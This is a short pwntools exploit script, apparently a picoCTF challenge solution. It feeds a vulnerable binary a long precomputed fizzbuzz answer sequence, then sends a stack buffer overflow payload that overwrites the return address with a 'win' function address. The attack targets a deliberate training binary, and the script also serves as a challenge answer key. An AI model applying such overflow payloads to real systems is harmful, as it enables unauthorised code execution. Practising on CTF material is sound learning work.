#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 22210)

    return r


def main():

    r = conn()

    generated_payload = b'wrong\n1\n2\nfizz\nwrong\nwrong\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\n7\n8\nfizz\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\n7\nwrong\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\n7\n8\nfizz\nbuzz\n11\nfizz\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\n7\n8\nfizz\nbuzz\n11\nfizz\n13\n14\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\n7\n8\nfizz\nbuzz\n11\nfizz\n13\n14\nfizzbuzz\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\n7\n8\nfizz\nbuzz\n11\nfizz\n13\n14\nfizzbuzz\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\n7\n8\nfizz\nwrong\nwrong\n1\nwrong\nwrong\n1\n2\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\n7\n8\nfizz\nbuzz\n11\nfizz\n13\n14\nfizzbuzz\n16\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\n7\n8\nfizz\nbuzz\n11\nfizz\nwrong\n1\n2\nfizz\n4\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\nwrong\n1\n2\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\nwrong\n1\n2\nfizz\n4\nbuzz\nwrong\n1\n2\nfizz\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\n7\n8\nfizz\nbuzz\n11\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\n7\n8\nfizz\nbuzz\n11\nfizz\nwrong\n1\n2\nfizz\n4\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\n7\n8\nfizz\nbuzz\n11\nfizz\nwrong\n1\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\n7\n8\nfizz\nbuzz\n11\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\n7\n8\nfizz\nbuzz\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\n7\n8\nwrong\n1\n2\nfizz\n4\nbuzz\nfizz\n7\n8\nfizz\nbuzz\n11\nfizz\n13\nwrong\n1\n2\nfizz\nwrong\n1\n2\nfizz\n4\nwrong\n1\n2\nfizz\n4\nwrong\nwrong'
    r.send(generated_payload)

    win_addr = 0x8048656
    r.sendline(b'A' * (0x63 + 8) + p32(win_addr))

    r.interactive()


if __name__ == "__main__":
    main()
